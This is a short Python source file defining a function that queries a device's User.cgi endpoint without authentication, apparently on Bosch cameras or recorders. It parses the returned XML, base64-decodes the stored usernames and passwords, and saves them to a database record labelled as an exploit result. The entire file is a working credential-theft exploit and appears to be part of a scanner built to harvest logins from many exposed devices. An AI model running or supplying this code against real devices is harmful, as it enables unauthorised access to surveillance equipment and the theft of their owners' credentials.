import base64

import requests
import xmltodict


def bosch_usernames(device):
    ip = device.ip
    port = device.port
    result = {}

    try:
        uri = f"http://{ip}:{port}/User.cgi?cmd=get_user"
        resp = requests.get(url=uri)

        resp_text = resp.text

        doc = xmltodict.parse(resp_text)
        for user in doc["USER_SETTING"]:
            if user == "result":
                pass
            else:
                try:
                    username = doc["USER_SETTING"][user]["USERNAME"]
                    password = doc["USER_SETTING"][user]["PWD"]

                    if username:
                        decoded_username = base64.b64decode(username)
                        decoded_password = base64.b64decode(password)
                        unicode_username = decoded_username.decode("utf-8")
                        unicode_password = decoded_password.decode("utf-8")
                        result[unicode_username] = unicode_password
                        device.exploit = result
                        device.exploit_scanned = True
                        device.save()
                        return result
                except Exception:
                    return {}
    except Exception:
        return {}





